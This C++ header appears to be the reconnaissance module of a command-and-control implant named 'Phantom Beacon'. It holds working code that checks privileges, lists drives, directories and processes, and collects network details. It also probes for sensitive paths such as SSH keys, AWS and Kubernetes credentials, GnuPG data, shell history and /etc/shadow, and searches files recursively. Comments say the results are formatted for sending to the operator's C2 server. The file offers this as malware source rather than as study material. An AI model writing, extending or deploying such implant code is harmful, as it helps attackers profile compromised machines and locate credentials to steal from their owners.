#pragma once
// ============================================================================
//  recon.h — Phantom Beacon File System Reconnaissance
//  ─────────────────────────────────────────────────────
//  Enumerate logical drives, traverse directories, locate sensitive files.
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <tlhelp32.h>
    #include <iphlpapi.h>
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <dirent.h>
    #include <sys/stat.h>
    #include <sys/statvfs.h>
    #include <unistd.h>
    #include <ifaddrs.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #include <sys/utsname.h>
    #include <fstream>
    #include <cstdio>
    #include <ctime>
    #include <cstdlib>
#endif
#include <string>
#include <vector>
#include <sstream>

namespace recon {

// ── Privilege Check ─────────────────────────────────────────────────────────

inline std::string get_privilege() {
#ifdef _WIN32
    BOOL elevated = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION te;
        DWORD size = sizeof(te);
        if (GetTokenInformation(hToken, TokenElevation, &te, size, &size))
            elevated = te.TokenIsElevated;
        CloseHandle(hToken);
    }
    return elevated ? "Admin" : "User";
#elif defined(__ANDROID__)
    if (getuid() == 0) return "Root";
    // Check if we have CAP_NET_ADMIN or system UID
    if (getuid() < 10000) return "System";
    return "App";
#else
    if (getuid() == 0) return "Root";
    return "User";
#endif
}

// ── Drive Enumeration ──────────────────────────────────────────────────────

struct DriveInfo {
    std::string letter;     // "C:\\"
    std::string type;       // "Fixed", "Removable", "Network", etc.
    uint64_t totalBytes;
    uint64_t freeBytes;
};

inline std::string drive_type_str(unsigned int type) {
#ifdef _WIN32
    switch (type) {
        case DRIVE_REMOVABLE: return "Removable";
        case DRIVE_FIXED:     return "Fixed";
        case DRIVE_REMOTE:    return "Network";
        case DRIVE_CDROM:     return "CD-ROM";
        case DRIVE_RAMDISK:   return "RAMDisk";
        default:              return "Unknown";
    }
#else
    return "Filesystem";
#endif
}

inline std::vector<DriveInfo> enumerate_drives() {
    std::vector<DriveInfo> drives;
#ifdef _WIN32
    char buf[512];
    DWORD len = GetLogicalDriveStringsA(sizeof(buf), buf);
    if (len == 0 || len > sizeof(buf)) return drives;

    for (char* p = buf; *p; p += strlen(p) + 1) {
        DriveInfo di;
        di.letter = p;
        di.type = drive_type_str(GetDriveTypeA(p));
        di.totalBytes = 0;
        di.freeBytes = 0;

        ULARGE_INTEGER freeAvail, total, totalFree;
        if (GetDiskFreeSpaceExA(p, &freeAvail, &total, &totalFree)) {
            di.totalBytes = total.QuadPart;
            di.freeBytes = totalFree.QuadPart;
        }
        drives.push_back(di);
    }
#else
    DriveInfo di;
    di.letter = "/";
    di.type = "Root FS";
    di.totalBytes = 0;
    di.freeBytes = 0;
    
    struct statvfs stat;
    if (statvfs("/", &stat) == 0) {
        di.totalBytes = stat.f_blocks * stat.f_frsize;
        di.freeBytes = stat.f_bavail * stat.f_frsize;
    }
    drives.push_back(di);
#endif
    return drives;
}

// ── Directory Listing ──────────────────────────────────────────────────────

struct FileEntry {
    std::string name;
    bool        isDir;
    uint64_t    size;      // 0 for directories
};

inline std::vector<FileEntry> list_directory(const std::string& path) {
    std::vector<FileEntry> entries;
#ifdef _WIN32
    std::string searchPath = path;
    if (searchPath.back() != '\\') searchPath += '\\';
    searchPath += '*';

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return entries;

    do {
        std::string name = fd.cFileName;
        if (name == "." || name == "..") continue;

        FileEntry fe;
        fe.name  = name;
        fe.isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        fe.size  = (static_cast<uint64_t>(fd.nFileSizeHigh) << 32) | fd.nFileSizeLow;
        entries.push_back(fe);
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
#else
    DIR *dir = opendir(path.c_str());
    if (!dir) return entries;
    
    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL) {
        std::string name = ent->d_name;
        if (name == "." || name == "..") continue;
        
        FileEntry fe;
        fe.name = name;
        fe.size = 0;
        
        std::string fullPath = path;
        if (fullPath.back() != '/') fullPath += '/';
        fullPath += name;
        
        struct stat st;
        if (stat(fullPath.c_str(), &st) == 0) {
            fe.isDir = S_ISDIR(st.st_mode);
            if (!fe.isDir) fe.size = st.st_size;
        } else {
            fe.isDir = (ent->d_type == DT_DIR);
        }
        entries.push_back(fe);
    }
    closedir(dir);
#endif
    return entries;
}

// ── Sensitive File/Directory Detection ─────────────────────────────────────
// Returns a list of "interesting" paths found on the system

inline std::vector<std::string> find_critical_paths() {
    std::vector<std::string> found;
    
#ifdef _WIN32
    const char* interesting[] = {
        "C:\\Users",
        "C:\\Windows\\System32\\config",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\ProgramData",
        "C:\\inetpub",
        "C:\\xampp",
        "C:\\wamp",
        nullptr
    };

    for (int i = 0; interesting[i]; ++i) {
        DWORD attrs = GetFileAttributesA(interesting[i]);
        if (attrs != INVALID_FILE_ATTRIBUTES) {
            found.push_back(interesting[i]);
        }
    }

    char userProfile[MAX_PATH];
    if (GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH)) {
        std::string up = userProfile;
        const char* subDirs[] = {
            "\\Desktop", "\\Documents", "\\Downloads",
            "\\AppData\\Roaming", "\\AppData\\Local",
            "\\.ssh", "\\.aws", "\\.kube",
            nullptr
        };
        for (int i = 0; subDirs[i]; ++i) {
            std::string full = up + subDirs[i];
            DWORD attrs = GetFileAttributesA(full.c_str());
            if (attrs != INVALID_FILE_ATTRIBUTES) {
                found.push_back(full);
            }
        }
    }
#else
    const char* interesting[] = {
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/var/www/html",
        "/root/.ssh",
        "/opt",
        "/tmp",
        nullptr
    };

    for (int i = 0; interesting[i]; ++i) {
        if (access(interesting[i], F_OK) == 0) {
            found.push_back(interesting[i]);
        }
    }

    const char* home = getenv("HOME");
    if (home) {
        std::string h = home;
        const char* subDirs[] = {
            "/.ssh", "/.aws", "/.kube", "/.gnupg", "/.bash_history",
            nullptr
        };
        for (int i = 0; subDirs[i]; ++i) {
            std::string full = h + subDirs[i];
            if (access(full.c_str(), F_OK) == 0) {
                found.push_back(full);
            }
        }
    }
#endif
    return found;
}

// Manually format an integer to string (locale-independent, no CRT deps)
inline std::string i2s(uint64_t n) {
    char buf[32]; int p = 0;
    if (n == 0) { buf[p++] = '0'; }
    else { while (n > 0 && p < 31) { buf[p++] = '0' + (n % 10); n /= 10; } }
    buf[p] = '\0';
    for (int i = 0; i < p / 2; i++) { char t = buf[i]; buf[i] = buf[p-1-i]; buf[p-1-i] = t; }
    return std::string(buf);
}

// ── Format Output ──────────────────────────────────────────────────────────
// Formats all recon data as a single string for transmission to the C2.

inline std::string format_human(const std::string& targetPath = "") {
    std::string out;

    out += "=== LOGICAL DRIVES ===\n";
    auto drives = enumerate_drives();
    for (auto& d : drives) {
        int totalGB = static_cast<int>(d.totalBytes / (1073741824.0));
        int freeGB  = static_cast<int>(d.freeBytes  / (1073741824.0));
        out += "  " + d.letter + "  [" + d.type + "]"
            + "  Total: " + i2s(totalGB) + " GB"
            + "  Free: " + i2s(freeGB) + " GB\n";
    }

    out += "\n=== CRITICAL PATHS ===\n";
    auto paths = find_critical_paths();
    for (auto& p : paths) {
        out += "  [FOUND] " + p + "\n";
    }

    if (!targetPath.empty()) {
        out += "\n=== DIRECTORY: " + targetPath + " ===\n";
        auto entries = list_directory(targetPath);
        for (auto& e : entries) {
            if (e.isDir) {
                out += "  [DIR]  " + e.name + "\n";
            } else {
                out += "  [FILE] " + e.name + "  (" + i2s(e.size) + " bytes)\n";
            }
        }
    }

    return out;
}

// ── System Information ─────────────────────────────────────────────────────

inline std::string get_sysinfo() {
    std::string out;
#ifdef _WIN32
    char user[256], computer[256];
    DWORD usize = sizeof(user), csize = sizeof(computer);
    if (GetUserNameA(user, &usize)) {
        out += "User: "; out += user; out += "\n";
    }
    if (GetComputerNameA(computer, &csize)) {
        out += "Host: "; out += computer; out += "\n";
    }
    out += "OS: Windows\n";
    out += "Priv: "; out += get_privilege(); out += "\n";
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    out += "Arch: ";
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) out += "x64\n";
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) out += "x86\n";
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM) out += "ARM\n";
    else out += "?\n";

    ULONGLONG mins = GetTickCount64() / 60000;
    {
        char mbuf[32];
        int mpos = 0;
        ULONGLONG mt = mins;
        if (mt == 0) { mbuf[mpos++] = '0'; }
        else { while (mt > 0) { mbuf[mpos++] = '0' + (mt % 10); mt /= 10; } }
        for (int mi = 0; mi < mpos / 2; mi++) { char tc = mbuf[mi]; mbuf[mi] = mbuf[mpos - 1 - mi]; mbuf[mpos - 1 - mi] = tc; }
        mbuf[mpos] = '\0';
        out += "Up: "; out += mbuf; out += "m\n";
    }
#else
    struct utsname buffer;
    if (uname(&buffer) == 0) {
        out += "OS: "; out += buffer.sysname; out += " "; out += buffer.release; out += "\n";
        out += "Host: "; out += buffer.nodename; out += "\n";
        out += "Arch: "; out += buffer.machine; out += "\n";
    }
    const char* u = getenv("USER");
    out += "User: "; out += (u ? u : "?"); out += "\n";
    out += "Priv: "; out += get_privilege(); out += "\n";
#endif
    return out;
}

// ── Network Information ────────────────────────────────────────────────────

inline std::string get_netinfo() {
    std::string out;
#ifdef _WIN32
    ULONG bufLen = 15000;
    PIP_ADAPTER_ADDRESSES pAddr = (PIP_ADAPTER_ADDRESSES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufLen);
    ULONG ret = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAddr, &bufLen);
    if (ret == ERROR_BUFFER_OVERFLOW) {
        HeapFree(GetProcessHeap(), 0, pAddr);
        pAddr = (PIP_ADAPTER_ADDRESSES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufLen);
        ret = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAddr, &bufLen);
    }

    if (ret == NO_ERROR && pAddr) {
        for (PIP_ADAPTER_ADDRESSES p = pAddr; p; p = p->Next) {
            if (p->OperStatus != IfOperStatusUp || p->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;
            char desc[256];
            WideCharToMultiByte(CP_UTF8, 0, p->FriendlyName, -1, desc, sizeof(desc), NULL, NULL);
            out += "IF: "; out += desc; out += "\n";
            if (p->PhysicalAddressLength > 0) {
                out += "  MAC: ";
                for (ULONG i = 0; i < p->PhysicalAddressLength; i++) {
                    static const char hx[] = "0123456789ABCDEF";
                    unsigned char b = p->PhysicalAddress[i];
                    out += hx[b >> 4]; out += hx[b & 0xF];
                    if (i < p->PhysicalAddressLength - 1) out += ":";
                }
                out += "\n";
            }
            for (PIP_ADAPTER_UNICAST_ADDRESS u = p->FirstUnicastAddress; u; u = u->Next) {
                char ip[NI_MAXHOST] = {0};
                sockaddr* sa = u->Address.lpSockaddr;
                if (sa->sa_family == AF_INET && inet_ntop(AF_INET, &((sockaddr_in*)sa)->sin_addr, ip, sizeof(ip)))
                    { out += "  IPv4: "; out += ip; out += "\n"; }
                else if (sa->sa_family == AF_INET6 && inet_ntop(AF_INET6, &((sockaddr_in6*)sa)->sin6_addr, ip, sizeof(ip)))
                    { out += "  IPv6: "; out += ip; out += "\n"; }
            }
            for (PIP_ADAPTER_GATEWAY_ADDRESS_LH g = p->FirstGatewayAddress; g; g = g->Next) {
                char gw[NI_MAXHOST] = {0};
                sockaddr* sa = g->Address.lpSockaddr;
                if (sa->sa_family == AF_INET && inet_ntop(AF_INET, &((sockaddr_in*)sa)->sin_addr, gw, sizeof(gw)))
                    { out += "  GW: "; out += gw; out += "\n"; }
            }
            for (PIP_ADAPTER_DNS_SERVER_ADDRESS d = p->FirstDnsServerAddress; d; d = d->Next) {
                char dns[NI_MAXHOST] = {0};
                sockaddr* sa = d->Address.lpSockaddr;
                if (sa->sa_family == AF_INET && inet_ntop(AF_INET, &((sockaddr_in*)sa)->sin_addr, dns, sizeof(dns)))
                    { out += "  DNS: "; out += dns; out += "\n"; }
            }
        }
    }
    if (pAddr) HeapFree(GetProcessHeap(), 0, pAddr);
#endif
    return out;
}

// ── Process Information ────────────────────────────────────────────────────

inline std::string get_processes() {
    std::string out;
    out += "PID\tName\n--------------------------------\n";
#ifdef _WIN32
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do {
                out += i2s(pe32.th32ProcessID) + "\t" + pe32.szExeFile + "\n";
            } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
#else
    DIR *dir = opendir("/proc");
    if (dir) {
        struct dirent *ent;
        while ((ent = readdir(dir)) != NULL) {
            if (isdigit(ent->d_name[0])) {
                std::string pid = ent->d_name;
                std::string comm_path = "/proc/" + pid + "/comm";
                std::ifstream comm_file(comm_path);
                std::string name;
                if (comm_file >> name) {
                    out += pid + "\t" + name + "\n";
                }
            }
        }
        closedir(dir);
    } else {
        FILE* fp = popen("ps -eo pid,comm 2>/dev/null", "r");
        if (fp) {
            char line[512];
            while (fgets(line, sizeof(line), fp)) {
                out += line;
            }
            pclose(fp);
        } else {
            out += "Error: Cannot enumerate processes on this platform.\n";
        }
    }
#endif
    return out;
}

// ── Find Files ─────────────────────────────────────────────────────────────

inline void find_files_recursive(const std::string& path, const std::string& pattern, int depth, int max_depth, int& count, int max_count, std::string& out) {
    if (depth > max_depth || count >= max_count) return;

    auto entries = list_directory(path);
    for (const auto& e : entries) {
        if (count >= max_count) break;

        std::string fullPath = path;
        if (fullPath.back() != '/' && fullPath.back() != '\\') {
#ifdef _WIN32
            fullPath += '\\';
#else
            fullPath += '/';
#endif
        }
        fullPath += e.name;

        if (e.name.find(pattern) != std::string::npos) {
            out += "[FOUND] " + fullPath + "\n";
            count++;
        }

        if (e.isDir && e.name != "." && e.name != "..") {
            find_files_recursive(fullPath, pattern, depth + 1, max_depth, count, max_count, out);
        }
    }
}

inline std::string find_files(const std::string& root, const std::string& pattern) {
    std::string out;
    out += "Search Results for '" + pattern + "' in '" + root + "':\n";
    int count = 0;
    find_files_recursive(root, pattern, 0, 5, count, 100, out);
    if (count == 0) out += "No matches found.\n";
    else if (count >= 100) out += "\n... Results truncated at 100 hits.\n";
    return out;
}

}  // namespace recon
